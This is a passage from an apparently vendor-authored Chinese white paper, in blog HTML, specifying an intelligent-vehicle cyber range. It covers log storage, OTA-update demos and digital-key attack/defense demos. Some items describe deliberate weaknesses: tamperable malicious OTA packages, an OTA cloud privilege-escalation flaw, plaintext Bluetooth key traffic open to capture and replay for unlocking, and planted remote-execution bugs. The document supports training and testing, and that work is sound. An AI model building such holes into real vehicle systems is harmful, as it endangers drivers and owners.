title="大数据存储"></a>大数据存储</h4><h5 id="功能实施方案-55"><a href="#功能实施方案-55" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>提供大数据存储具备车辆设备日志数据存储功能，支持从车辆设备端采集的日志数据进行存储，车辆运行状态、传感器数据、故障信息等。这些日志数据对于后续的安全分析、故障诊断和优化具有重要意义。</p><p>提供大数据存储具备平台侧安全日志存储功能，平台具备存储平台侧产生的安全日志数据的能力，如安全事件记录、操作记录、用户行为跟踪等。这些日志对于分析威胁行为、安全审计和追溯非常关键。</p><p>提供大数据存储具备配置数据存储功能，针对车型、设备、应急响应、漏洞库、系统管理等配置信息，平台能够提供相应的存储空间。这些配置数据是实现靶场管理安全运营的重要基础。</p><p>提供大数据存储具备态势数据存储功能，平台能够支持存储态势数据，包括攻击态势、设备状态等信息。这些数据对于实时监控和安全预警至关重要。</p><p>提供大数据存储具备高效、准确存储与查询能力，平台能够支持构建高效的存储库表结构，确保数据的存储和查询高效且准确。同时，应支持灵活的扩展性，以满足未来数据增长的需求。通过高效的数据存储和查询机制，平台能够提供快速的数据访问和分析能力，提高安全运营的效率和响应速度。</p><h5 id="技术实现内容-48"><a href="#技术实现内容-48" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="车辆设备端日志数据存储模块"><a href="#车辆设备端日志数据存储模块" class="headerlink" title="车辆设备端日志数据存储模块"></a>车辆设备端日志数据存储模块</h6><p>支持车辆设备端日志数据存储：系统能够存储车辆设备端生成的日志数据，包括车辆操作记录、传感器数据等。</p><ul><li>定义数据结构：制定车辆设备端日志数据的数据模型，明确定义记录的字段，如时间戳、车辆标识、操作类型、传感器数据等。</li><li>数据标准化：对各个字段进行标准化，确保数据格式的一致性，方便后续的存储和分析。</li><li>设备端数据上传：设计设备端数据上传机制，支持车辆设备端将生成的日志数据上传至中央存储系统。</li><li>数据传输协议：使用安全可靠的数据传输协议，如HTTPS，确保数据在传输过程中的安全性。</li></ul><h6 id="平台侧安全日志数据存储模块"><a href="#平台侧安全日志数据存储模块" class="headerlink" title="平台侧安全日志数据存储模块"></a>平台侧安全日志数据存储模块</h6><p>支持平台侧安全日志数据存储：系统能够存储平台侧生成的安全日志数据，包括用户操作日志、系统事件日志等。具体设计如下。</p><ul><li>定义数据结构：制定平台侧安全日志数据的数据模型，明确定义记录的字段，如时间戳、用户标识、操作类型、系统事件等。</li><li>数据标准化：对各个字段进行标准化，确保数据格式的一致性，方便后续的存储和分析。</li><li>平台侧日志记录：在平台侧实施日志记录机制，记录用户操作日志、系统事件日志等。</li><li>数据上传协议：使用安全可靠的数据上传协议，确保日志数据能够安全可靠地上传至中央存储系统。</li></ul><h6 id="配置数据存储模块"><a href="#配置数据存储模块" class="headerlink" title="配置数据存储模块"></a>配置数据存储模块</h6><p>支持车型、设备、应急响应、漏洞库、系统管理等配置数据的存储：系统可以存储与车型、设备、应急响应、漏洞库、系统管理等相关的配置数据，以便后续的查询和使用。具体设计如下。</p><ul><li>定义配置数据结构：制定车型、设备、应急响应、漏洞库、系统管理等配置数据的数据模型，明确定义各个配置项的属性。</li><li>关联关系设计：建立各配置项之间的关联关系，确保数据之间的一致性和关联性。</li><li>选择存储引擎：根据配置数据的特性，选择合适的存储引擎，如关系型数据库、NoSQL数据库等。</li><li>数据索引优化：设计合适的索引，以加速对配置数据的查询操作。</li></ul><h6 id="态势数据存储模块"><a href="#态势数据存储模块" class="headerlink" title="态势数据存储模块"></a>态势数据存储模块</h6><p>支持态势数据的存储：系统能够存储与态势感知相关的数据，包括威胁情报、安全事件、攻击行为等数据，以便进行分析和展示。具体设计如下。</p><ul><li>定义态势数据结构：制定态势数据的数据模型，包括威胁情报、安全事件、攻击行为等的字段和关联关系。</li><li>标准化数据格式：对态势数据中的各个字段进行标准化，确保数据格式的一致性。</li><li>存储引擎选择：选择适合态势数据的存储引擎，例如时序数据库、图数据库等，以支持不同类型的查询和分析。</li><li>数据索引优化：设计索引以加速对态势数据的查询操作，考虑到数据量可能较大的情况。</li></ul><h6 id="存储库表构建与扩展模块"><a href="#存储库表构建与扩展模块" class="headerlink" title="存储库表构建与扩展模块"></a>存储库表构建与扩展模块</h6><p>构建存储库表：系统支持构建适应数据存储需求的库表结构，确保存储的高效性和准确性。</p><p>高效查询与灵活扩展：系统能够实现对存储数据的高效查询，提供快速的查询响应时间，并支持根据需求灵活扩展存储库表结构，以适应数据量和数据类型的变化。具体设计如下。</p><ul><li>数据库设计：</li></ul><p>规范化设计：采用数据库规范化设计，确保数据不冗余、一致性高，减少更新异常。</p><p>合适的数据类型：选择合适的数据类型，确保存储空间的有效利用，提高查询效率。</p><p>索引设计：设计适当的索引，以加速查询操作，但要注意过多索引可能会影响写入性能。</p><ul><li>查询优化：</li></ul><p>查询计划分析：使用数据库查询计划分析工具，优化查询语句，确保数据库引擎能够选择最优的执行计划。</p><p>适当的缓存：使用数据库缓存机制，提高频繁查询的性能，尤其对于读取较为静态的数据。</p><ul><li>灵活扩展：</li></ul><p>可扩展的架构：采用可扩展的数据库架构，如分布式数据库，以便灵活扩展存储容量和吞吐量。</p><p>动态表结构设计：考虑采用动态表结构设计，以支持根据需求动态添加字段，适应数据类型的变化。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>靶场资源库白皮书</title>
      <link href="posts/2edb146c/"/>
      <url>posts/2edb146c/</url>
      
        <content type="html"><![CDATA[<p><strong>靶场资源库</strong></p><p><strong>技术白皮书</strong></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f0f87ae178beabba34ab47812799c4cb.png"></p><p>浙江国利网安科技有限公司</p><p>目 录</p><p>1 智能汽车网络靶场演示模块 1</p><p>1.1 技术路线 1</p><p>1.1.1 OTA远程升级攻防演示模块 1</p><p>1.1.2 数字钥匙攻防演示模块 6</p><p>1.1.3 V2X攻防演示模块 10</p><p>1.1.4 自动驾驶演示模块 17</p><p>1.1.5 异地互联演示模块 21</p><p>1.1.6 整车厂网络攻防演练演示模块 23</p><p>1.1.7 联邦靶场攻防演练演示模块 30</p><p>2 智能汽车网络靶场资源库 35</p><p>2.1 总体概述 35</p><p>2.2 系统概述 35</p><p>2.3 系统组成 35</p><p>2.4 靶场资源库总体要求 36</p><p>2.4.1 靶标库 36</p><p>2.4.2 知识库 36</p><p>2.4.3 用例库 37</p><p>2.4.4 工具库 37</p><p>3 智能汽车网络靶场靶标库 38</p><p>3.1 技术路线 38</p><p>3.1.1 靶标库开发 38</p><p>4 智能汽车网络靶场知识库 67</p><p>4.1 技术路线 67</p><p>4.1.1 智能汽车网络靶场漏洞库 67</p><p>4.1.2 智能汽车网络靶场威胁情报库 70</p><p>4.1.3 智能汽车网络靶场事件库 76</p><p>4.1.4 智能汽车网络靶场资产库 78</p><p>4.1.5 智能汽车网络靶场攻击者库 80</p><p>4.1.6 智能汽车网络靶场治理资源库 82</p><p>4.1.7 智能汽车网络靶场IP地址库 83</p><p>5 智能汽车网络靶场测试用例库 86</p><p>5.1 技术路线 86</p><p>5.1.1 测试用例开发 86</p><p>5.1.2 测试策略及测试规范开发方案 88</p><p>5.1.3 用例库 91</p><p>6 智能汽车网络靶场工具库-密码检测工具 111</p><p>6.1 技术路线 111</p><p>6.1.1 智能汽车网络靶场密码检测测试工具 111</p><p>7 智能汽车网络靶场工具库-V2X安全检测平台 163</p><p>7.1 技术路线 163</p><p>7.1.1 V2X安全检测平台 163</p><p>7.1.2 测试环境基础平台 167</p><p>7.1.3 测试模拟系统 173</p><p>7.1.4 测试系统管理模块 180</p><p>7.1.5 测试系统执行模块 180</p><p>7.1.6 测试系统报告生成模块 181</p><p>7.1.7 V2X安全演示功能 181</p><p>7.1.8 V2X安全检测平台 182</p><p>8 智能汽车网络靶场工具库-业务安全测试工具 187</p><p>8.1 技术路线 187</p><p>8.1.1 蓝牙安全测试工具 187</p><p>8.1.2 蓝牙协议分析工具 193</p><p>8.1.3 蓝牙BLE检测工具 195</p><p>8.1.4 WIFI安全测试工具 198</p><p>8.1.5 射频钥匙安全测试工具 205</p><p>8.1.6 NFC安全检测工具 210</p><p>8.1.7 OTA测试工具 214</p><p>8.1.8 车辆信号模拟仿真软件 219</p><p>8.1.9 车载网络安全测试工具 221</p><p>8.1.10 诊断需求定义工具 229</p><p>9 智能汽车网络靶场工具库-数据安全测试工具 232</p><p>9.1 技术路线 232</p><p>9.1.1 车端数据安全测试工具 232</p><p>9.1.2 APP隐私合规测试工具 238</p><p>9.1.3 云端数据检查工具 249</p><p>10 智能汽车网络靶场工具库-系统安全测试工具 259</p><p>10.1 技术路线 259</p><p>10.1.1 模糊测试工具 259</p><p>10.1.2 APP自动化检测工具 266</p><p>10.1.3 APP加固工具 276</p><p>10.1.4 Android应用程序反编译工具 286</p><p>10.1.5 系统漏洞扫描工具 299</p><p>10.1.6 Web安全扫描工具 304</p><p>10.1.7 集成渗透测试工具 306</p><p>10.1.8 漏洞利用工具 317</p><p>10.1.9 源代码安全审计工具 318</p><p>10.1.10 开源组件检查工具 325</p><p>10.1.11 二进制反汇编工具 334</p><p>10.1.12 二进制分析工具 346</p><p>10.1.13 Web漏洞扫描工具 352</p><h1 id="智能汽车网络靶场演示模块"><a href="#智能汽车网络靶场演示模块" class="headerlink" title="智能汽车网络靶场演示模块"></a>智能汽车网络靶场演示模块</h1><h2 id="技术路线"><a href="#技术路线" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="OTA远程升级攻防演示模块"><a href="#OTA远程升级攻防演示模块" class="headerlink" title="OTA远程升级攻防演示模块"></a>OTA远程升级攻防演示模块</h3><h4 id="功能实施方案"><a href="#功能实施方案" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>为了更好地控制零件升级的过程和确保车辆的安全性，平台支持零件管理功能，按照ECU类型分类管理，包括建立零件列表、版本管理、升级计划、安全检测、升级日志和用户界面等功能平台支持车辆、车型管理功能，车辆绑定车型，车型关联ECU信息。可以在平台查看每辆车的所有ECU详细软硬件信息。</li><li>平台支持车辆的注册、录入、维护、查询、删除等操作，在车辆注册时，需要输入车辆的基本信息，例如车牌号、VIN码、品牌、型号等，在车辆录入后，可以在平台上查看每辆车的所有ECU详细软硬件信息。平台支持车型的管理，包括车型注册、录入、维护、查询、删除等操作。在车型注册时，需要输入车型的基本信息，例如车型名称、品牌、型号等，同时，还需要关联该车型所对应的ECU信息。平台支持车辆与车型之间的绑定关系，即每辆车都应该对应一个特定的车型，通过车辆与车型的绑定，可以更加精确地管理车辆软件升级过程。平台支持车型与ECU信息的关联，即每种车型都应该对应一组特定的ECU信息。在车型注册时，需要关联该车型所对应的ECU信息，包括ECU类型、型号、版本号等基本信息，通过车型与ECU信息的关联，可以更加精确地管理车辆软件升级过程。平台应提供查询车辆软硬件信息的功能，包括车辆基本信息、车型信息和ECU信息等，通过查询车辆软硬件信息，可以更好地进行车辆软件升级和管理。</li><li>平台支持ECU软件版本管理功能。每个软件包只能唯一关联到一个ECU，并确保每个ECU的软件版本号唯一。平台支持ECU软件包的注册、上传、维护和删除操作，同时提供对软件版本号的唯一性管理。通过建立软件包和ECU之间的关联关系，平台可以实现精确的软件升级。</li><li>平台支持升级包管理功能。用户可以上传ECU各部分软件，包括MCU升级包、MPU升级包以及配置文件等，并通过平台对这些软件进行打包、签名和加密等操作，最终生成ECU的升级文件。这样的功能扩展使得平台能够更好地管理和处理用户上传的软件，并为ECU的升级过程提供可靠的支持。</li><li>平台支持差分功能，通过对软件对版本进行差分处理，有效减少生成的最终升级文件大小。差分处理主要是通过将新版本与旧版本之间的差异进行记录和提取，只传输差异部分，而不是整个升级文件。这种方式节省了带宽和存储资源，并加快了升级过程。平台能够自动识别版本差异，生成差分补丁，并在设备端进行差分升级，实现快速、高效的软件更新。这种差分功能为用户提供了更便捷、经济的升级体验，同时降低了网络传输和存储成本。</li><li>平台支持升级策略管理。通过升级策略限定每次升级的范围（如：单辆车、小批量、所有车辆等）达到灰度升级的目的，截图见“产品功能截图”部分。</li><li>平台支持升级任务管理的功能，该功能包括升级任务的创建、审核、取消以及执行状态的监控等多项功能。用户可以通过平台创建新的升级任务，并在需要时对任务进行审核或取消操作。同时，平台还提供了升级任务执行状态的监控功能，用户可以实时查看任务的执行进度和结果。这样的功能扩展使得平台能够更好地管理和控制升级任务的整个生命周期，提高任务的可控性和效率，确保升级过程的稳定性和准确性。</li><li>平台支持日志管理的功能，该功能可以对车辆上传的升级日志信息进行存储、分析和处理。平台可以将所有的升级日志信息进行记录和存储，并提供相应的查询和检索功能，以便用户随时查看和分析。同时，平台还可以对这些日志信息进行统计和分析，进一步优化升级过程。</li><li>平台支持大数据分析的功能，该功能可以对后台收集和产生的信息进行分析和呈现。其中包括对车辆总数进行统计，实时监测车辆的活跃状态，以及分析车辆的ECU软件版本情况。此外，平台还能进行升级任务执行成功率的统计和分析。通过大数据分析功能，平台可以对海量的数据进行处理和挖掘，提取有价值的信息并进行可视化呈现。这样的分析结果可以帮助用户了解整个车辆群体的概况，洞察车辆的运行状态和软件版本分布情况，从而更好地制定升级策略和优化升级流程。同时，通过分析升级任务执行成功率，平台可以检测和诊断可能存在的问题，及时采取措施进行改进和修复。</li><li>平台支持多维度的用户管理，管理员可以创建不同类型的用户账号，并分配相应的角色和权限。用户可以根据其职责和需求被分配为不同的角色，如管理员、操作员、观察员等。每个角色都拥有特定的权限，以限制用户在平台上的操作范围。这样的多维度用户管理可以满足不同用户的需求，确保系统的安全性和可控性。平台支持批量或单独为用户配置权限，管理员可以根据具体情况，对用户进行权限的批量配置或单独配置。通过灵活的权限配置，可以确保不同用户在平台上只能执行其所需的操作，从而降低潜在的风险和错误操作。平台还记录用户的操作记录，无论是管理员还是普通用户，在平台上的操作都会被记录下来。管理员可以查看用户的操作记录，以便及时发现异常行为或错误操作，并做出相应的处理和纠正。这样的操作记录功能可以提高平台的安全性和可追溯性，为用户提供更好的管理和监控手段。</li><li>平台支持TLS协议，通过TLS协议进行双向认证是车端与后台的通信进行数据安全防护的一种方式，主要对数据进行加密和对传输会话进行身份验证，防止数据被窃取、篡改，确在传输过程中的信息安全。平台实现了TLS双向认证。在双向认证中，不仅后台会对车辆端进行身份验证，车辆端也会对后台进行身份验证。这样双向的认证机制能够确保通信的双方都是合法的、可信任的实体，有效地防止中间人攻击和伪造身份的风险。在TLS双向认证通信过程中，车辆端和后台会交换数字证书，用于验证彼此的身份。通过验证对方的数字证书，车辆端和后台可以确认对方的身份，并建立起安全的通信连接。</li><li>支持OTA缺少升级包校验的功能，即在上传升级包后，对升级包的完整性进行校验，若存在缺少升级包内容的情况则作出相应提示并拒绝下发。在OTA升级平台中，具备进行升级包被篡改功能，测试人员可以通过篡改升级包的特定恶意文件，向车辆刷入恶意升级包，以此来做恶意升级包篡改刷写测试。</li><li>在OTA升级平台中，具备进行升级包被篡改功能，测试人员可以通过篡改升级包的特定恶意文件，如向车辆刷入可控制车机屏幕操作权限的恶意升级包，以此来为攻防测试的攻击者提供一条攻击路径。</li><li>支持车辆与云平台正常升级数据与恶意升级包数据的光电效果显示的功能。通过这种功能，用户可以更加直观地了解车辆是否受到了恶意攻击，从而及时采取相应的安全措施。</li><li>支持OTA云平台存在提权漏洞的功能，这一能主要是用来演示如何利用漏洞获取OTA云平台的控制权，从而进一步控制与之相连的设备。</li><li>支持云平台被攻击者夺取控制，攻击者可以往车辆下发虚假的升级包，从而干扰车辆的正常运行，甚至导致车辆失控</li><li>支持模拟攻击生成大量的无用升级包，并模拟向车机推送的过程。通过这种方式，可以演示攻击者如何利用这一漏洞影响车机的正常使用，并让用户和开发者深入了解这种攻击的危害性。</li><li>支持攻击方与云平台攻击数据的光电效果显示。通过这一功能，用户可以直观地观察到攻击过程中数据的变化和交互。当攻击方发起攻击时，模块会实时显示攻击数据的光电效果，让用户能够清晰地了解攻击的进展和影响。</li></ol><h4 id="产品功能截图"><a href="#产品功能截图" class="headerlink" title="产品功能截图"></a>产品功能截图</h4><ul><li>平台支持升级策略管理。通过升级策略限定每次升级的范围（如：单辆车、小批量、所有车辆等）达到灰度升级的目的，需提供产品功能截图。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/421021b73aff0a900514f2bd2518bee8.png" alt="1703409936461"></p><h4 id="技术实现内容"><a href="#技术实现内容" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>为验证及测试OTA升级管理的安全性，需要为汽车网络靶场搭建一套OTA远程升级攻防演示平台，该平台具备OTA远程升级所需，可用于管理和执行远程设备升级的系统，该平台提供了一个集中化的管理界面，用于上传软件包、创建升级任务、监控升级过程和管理设备。</p><p>演示步骤：</p><p>1.首先在本地搭建OTA升级的管理平台和相关软件，负责存储软件包和管理升级过程，OTA管理平台提供管理界面，用于上传软件包、创建升级任务、监控升级进度等功能。</p><p>2.软件包管理：在OTA管理平台上，准备要升级的软件包。这些软件包是经过打包和签名的固件或应用程序版本。</p><p>3.设备注册和身份验证：在OTA管理平台上，为目标设备创建唯一的标识符，并设置设备的注册和身份验证机制。这将确保只有经过授权的设备才能接收和执行升级任务。</p><p>4.升级任务创建：使用OTA管理平台，创建升级任务并指定目标设备。选择要升级的软件包版本，并设置升级计划和策略，如升级时间、优先级等。</p><p>5.升级过程监控：OTA管理平台将提供实时监控功能，用于跟踪升级任务的执行情况。查看目标设备的在线状态、升级进度和日志信息。</p><p>6.远程升级执行：一旦升级任务创建并启动，OTA管理平台将向目标设备发送升级通知。目标设备接收到通知后，会下载并安装升级软件包。在OTA管理平台上查看升级任务的执行情况和结果。</p><p>OTA远程升级攻防演示模块包含以下功能：</p><p>OTA远程升级攻防演示模块通过OTA功能，进行零部件管理和ECU分类管理，可以远程更新和管理汽车的ECU零件。OTA还可以用于诊断和故障排除。</p><p>OTA远程升级攻防演示模块通过车辆管理功能，车辆绑定车型，可以方便地查看和管理每辆车辆的信息。OTA平台还支持车型管理功能，允许将每个车型与相应的ECU信息进行关联。</p><p>OTA远程升级攻防演示模块在OTA平台上，每个软件包都有一个唯一的标识符或版本号，通过平台进行ECU软件版本管理。</p><p>OTA远程升级攻防演示模块在OTA平台上，可以上传包括MCU升级包、MPU升级包、配置文件等在内的各个部分软件。在生成升级文件之前，OTA平台还提供签名和加密的功能。OTA平台会生成一个经过打包、签名和加密的升级文件，该文件可以直接应用于目标ECU进行软件升级。</p><p>OTA远程升级攻防演示模块差分升级是一种将目标版本与基准版本进行比较，且仅传输两个版本之间的差异部分的升级方式。</p><p>OTA远程升级攻防演示模块灰度升级是指在软件或固件升级过程中，将升级的范围限制在一部分设备上进行测试和验证，而不是立即对所有设备进行全量升级。通过OTA平台的升级策略管理功能，灵活地设置升级的范围。升级策略管理根据设备的属性、地理位置、网络条件等因素进行细致的配置。</p><p>OTA远程升级攻防演示模块升级任务创建：通过OTA平台，可以创建升级任务。升级任务审核：系统会设置升级任务的审核流程，以确保升级任务的合规性和安全性。升级任务取消：如果在升级任务执行之前，需要取消该任务，OTA平台也提供了相应的功能升级.任务执行状态监控：通过OTA平台实时监控升级任务的执行状态。</p><p>OTA远程升级攻防演示模块OTA平台可以帮助用户存储、分析和处理车辆上传的升级日志信息。</p><p>OTA远程升级攻防演示模块通过对车辆总数、车辆活跃状态、车辆ECU软件版本情况、升级任务执行成功率等进行分析，平台可以帮助用户发现问题、改进策略，并提高升级系统的可靠性和效率。</p><p>OTA远程升级攻防演示模块具备多维度的用户、角色、权限管理功能，可以批量或单独为用户配置权限，可以查看操作记录。</p><p>OTA远程升级攻防演示模块TLS双向认证，以确保数据传输安全。</p><p>OTA远程升级攻防演示模块为了防止升级包篡改，从而导致车辆被刷入恶意升级包，提供对升级包进行完整性校验对缺少升级包进行校验。</p><p>OTA远程升级攻防演示模块具备车机屏幕因恶意升级包被控制功能。</p><p>OTA远程升级攻防演示模块具备显示光电效果功能，实现车辆与云平台正常升级数据与恶意升级包数据的显示。</p><p>OTA远程升级攻防演示模块具备OTA云平台存在提权漏洞功能。</p><p>OTA远程升级攻防演示模块具备云平台被夺取后往车辆下发无用升级包功能。</p><p>OTA远程升级攻防演示模块具备大量无用升级包导致车机频繁弹出升级信息无法正常使用功能。</p><h3 id="数字钥匙攻防演示模块"><a href="#数字钥匙攻防演示模块" class="headerlink" title="数字钥匙攻防演示模块"></a>数字钥匙攻防演示模块</h3><h4 id="功能实施方案-1"><a href="#功能实施方案-1" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>平台支持用户对车辆进行管理，包括添加新车辆、删除已有车辆、编辑车辆信息等操作。用户可以根据车辆的不同属性进行分类管理，方便快速查找和处理。在平台上，用户可以定义和管理不同的车型。用户可以创建新的车型并设置相应的参数，如车型名称、车辆特性、ECU配置等。这样可以更精确地对车辆进行管理，并为不同车型分配相应的钥匙信息。用户可以将特定的车辆与特定的车型进行绑定。这样，当特定车辆上线时，系统会自动识别在平台上，用户可以将车型与相应的钥匙信息进行关联。通过这种关联，系统可以在车辆使用数字钥匙进行身份验证时，根据车辆所属的车型，自动匹配合适的钥匙信息。车辆所属的车型，并加载相应的钥匙信息和配置。用户可以在平台上获取特定车辆的ECU配置、固件版本、传感器状态等详细信息，以便进行故障排查和维护操作。</li><li>平台支持钥匙管理，包含钥匙状态，发放、吊销、冻结、分享钥匙，截图见“产品功能截图”部分。</li><li>平台支持多维度的用户管理，管理员可以创建不同类型的用户账号，并分配相应的角色和权限。用户可以根据其职责和需求被分配为不同的角色，如管理员、操作员、观察员等。每个角色都拥有特定的权限，以限制用户在平台上的操作范围。这样的多维度用户管理可以满足不同用户的需求，确保系统的安全性和可控性。平台支持批量或单独为用户配置权限，管理员可以根据具体情况，对用户进行权限的批量配置或单独配置。通过灵活的权限配置，可以确保不同用户在平台上只能执行其所需的操作，从而降低潜在的风险和错误操作。平台还记录用户的操作记录，无论是管理员还是普通用户，在平台上的操作都会被记录下来。管理员可以查看用户的操作记录，以便及时发现异常行为或错误操作，并做出相应的处理和纠正。这样的操作记录功能可以提高平台的安全性和可追溯性，为用户提供更好的管理和监控手段。</li><li>数字钥匙APP应包含以下功能：</li><li>认证管理：该功能提供了基于不同数字钥匙协议的认证服务。通过该功能，用户可以进行身份认证，确保只有授权用户可以使用数字钥匙进行车辆访问和控制。</li><li>钥匙管理：该功能提供了基于不同数字钥匙协议的钥匙全生命周期管理服务。用户可以通过该功能分享、吊销、停用和恢复数字钥匙，确保只有授权用户可以访问特定车辆，并且可以有效地管理和控制数字钥匙的使用。</li><li>车辆控制：该功能实现了基于不同数字钥匙协议的遥控车门解锁和上锁（RKE）功能。用户可以通过手机或其他移动终端使用数字钥匙APP，远程控制车辆的车门状态，提供便捷的车辆访问方式。</li><li>状态同步：该功能基于不同数字钥匙协议，提供了查看车辆状态的移动终端功能。用户可以通过数字钥匙APP查看车辆的实时状态，如车辆位置、电池状态、里程数等，保持对车辆的实时了解。</li><li>定位计算：具备基于BLE的高精度定位计算能力，可以提供车内精确的位置定位，判定与之相连的相关BLE设备的位置是否位于提前设置的边界内，超出边界即可以拒绝响应BLE相关功能服务。</li><li>密码模块：该功能支持安全存储，密码算法（支持国密算法、国际通用密码算法）等功能，即通过可靠的密码算法，确保数据的机密性和完整性，确保敏感信息不被泄露甚至被篡改，通过该功能模块可实现数字钥匙方案中的安全存储、密码算法的需求。通过该模块的安全存储功能，对其他数字钥匙的敏感信息（如密码、密钥、证书等）进行安全存储，以确保数据的安全。</li><li>蓝牙连接管理：支持建立安全的蓝牙连接，包括配对绑定及连接功能，它支持不同数字钥匙协议所需的蓝牙配对过程，包括配对码输入、数字证书验证等，以确保只有授权的数字钥匙可以与设备进行通信以保证数字钥匙和设备之间的通信安全和可靠性。根据定位计算需求的不同，该模块可支持对移动终端蓝牙模块进行配置，以实现不同的定位需求。</li><li>该模块可以通过系统配置，解除对蓝牙通信数据加密的功能，让数字钥匙车端与移动端的蓝牙通信以明文传输的方式进行，以此种方式创建出一种明文通信的场景，技术人员可以通过劫取蓝牙通信，进行数字钥匙信息泄露的测试。</li><li>攻击方可以通过上方12)模块中创建的明文通信场景，劫取到数字钥匙对车辆发送的明文控车信号，如开车门、开车窗、启动发动机等，通过对劫取到的信号进行重放，以实现通过被泄露的钥匙信息完成车辆解锁的测试。</li><li>支持攻击方与车辆的攻击数据光电效果显示。通过这一功能，用户可以直观地观察到攻击过程中数据的变化和交互。当攻击方发起攻击时，模块会实时显示攻击数据的光电效果，让用户能够清晰地了解攻击的进展和影响。</li><li>数字钥匙攻防演示模块，内置了一系列既定的漏洞，包含远程执行、数据窃取等漏洞，攻击测试者可以通过扫描数字钥匙云端平台存在的漏洞，基于漏洞特性可实现数字钥匙云平台远程执行漏洞攻击测试。</li><li>平台具备远程吊销用户钥匙的功能，通过具备操作远程控车权限的账户进入平台，找到需要吊销钥匙权限的制定车辆（单个车、多个车、全部车等），执行“吊销”，即可实现远程执行吊销用户钥匙的功能。</li><li>支持攻击方与云平台攻击数据的光电效果显示。通过这一功能，用户可以直观地观察到攻击过程中数据的变化和交互。当攻击方发起攻击时，模块会实时显示攻击数据的光电效果，让用户能够清晰地了解攻击的进展和影响。</li></ol><h4 id="产品功能截图-1"><a href="#产品功能截图-1" class="headerlink" title="产品功能截图"></a>产品功能截图</h4><ul><li>平台应支持钥匙管理，包含钥匙状态，发放、吊销、冻结、分享钥匙。</li></ul><h4 id="技术实现内容-1"><a href="#技术实现内容-1" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>为演示车辆数字钥匙的安全性，本方案将搭建一个专门用于测试的环境。下面是搭建测试环境的一般步骤：</p><p>1. 选择测试车辆：选择一辆用于测试的车辆（可以是一辆实际的车辆或者是一个模拟器），并确保它符合需要测试需求。</p><p>2. 搭建车辆通信网络：搭建一个用于车辆通信的网络环境（一个局域网或一个专门的测试网络），以模拟车辆与数字钥匙之间的通信。</p><p>3. 安装数字钥匙系统：根据需要测试的数字钥匙系统的要求，在测试车辆上安装相应的数字钥匙系统。确保数字钥匙系统与车辆的通信正常，并能够进行密钥交换和身份验证。</p><p>4. 创建测试数字钥匙：在测试环境中创建测试用的数字钥匙。为每个测试数字钥匙分配唯一的标识符，并设置相应的密钥和身份验证信息。</p><p>5. 进行安全性测试：根据需要安全测试计划，对数字钥匙系统进行安全性测试。包括身份验证绕过、密钥破解、通信窃听等方面的测试。确保测试过程中的数据和通信都受到适当的保护。</p><p>6. 分析测试结果：分析安全性测试的结果，评估数字钥匙系统的安全性。识别潜在的安全漏洞和风险，并提出改进建议。</p><p>数字钥匙攻防演示模块功能如下：</p><p>数字钥匙攻防演示模块通过车型管理功能，可以方便地查看和管理每辆车辆的信息，允许将每个车型与相应的ECU信息进行关联。</p><p>数字钥匙攻防演示模块通过车辆管理功能，可以方便地查看和管理每辆车辆的信息，允许将每个车型与相应的ECU信息进行关联。</p><p>数字钥匙攻防演示模块具备钥匙管理功能，能够实现钥匙状态，发放、吊销、冻结、分享钥匙。</p><p>数字钥匙攻防演示模块支持创建、编辑、删除和禁用用户账户，并具备用户信息管理功能；支持创建不同的角色，并将特定权限分配给每个角色；提供灵活的权限配置功能，允许管理员对不同角色或用户进行权限控制；支持批量为用户配置权限；记录用户的操作行为，包括登录、身份验证、访问权限、修改配置，提供查询和查看操作记录的功能。</p><p>认证管理：提供基于不同数字钥匙协议的认证服务。包括基于不同数字钥匙协议的身份认证。</p><p>钥匙管理：提供基于不同数字钥匙协议的钥匙全生命周期管理服务。实现不同数字钥匙协议的分享、吊销、停用、恢复等功能。</p><p>车辆控制：基于不同数字钥匙协议，实现RKE功能。</p><p>状态同步：基于不同数字钥匙协议，提供车辆状态移动终端查看功能。</p><p>定位计算：提供基于BLE的高精度定位计算能力。</p><p>密码模块：提供数字钥匙方案所需要的安全存储，密码算法（支持国密算法、国际通用密码算法）等功能。并为其他数字钥匙敏感信息提供安全存储功能。</p><p>蓝牙连接管理：提供不同数字钥匙协议所需的蓝牙配对绑定及连接功能。同时根据定位计算需求，对移动终端蓝牙模块进行配置。</p><p>数字钥匙攻防演示模块具有数字钥匙车端与移动端蓝牙明文通信功能，以免导致钥匙信息的泄露。</p><p>数字钥匙攻防演示模块具备攻击方通过被泄露的钥匙信息完成车辆解锁功能。</p><p>数字钥匙攻防演示模块支持攻击方与车辆的攻击数据光电效果显示的功能。</p><p>数字钥匙攻防演示模块具备数字钥匙云平台存在远程执行漏洞功能。</p><p>数字钥匙攻防演示模块可以远程对用户的钥匙进行吊销操作，将其禁用或删除。确保吊销钥匙的命令能够及时同步到相关的车辆系统中，以便确保车辆收到有关禁止解锁的指令。如果车辆接收到禁止解锁指令后，会禁止对应用户的钥匙进行解锁操作。</p><p>数字钥匙攻防演示模块能够通过光电效果显示攻击方与云平台攻击数据。</p><h3 id="V2X攻防演示模块"><a href="#V2X攻防演示模块" class="headerlink" title="V2X攻防演示模块"></a>V2X攻防演示模块</h3><h4 id="功能实施方案-2"><a href="#功能实施方案-2" class="headerlink" 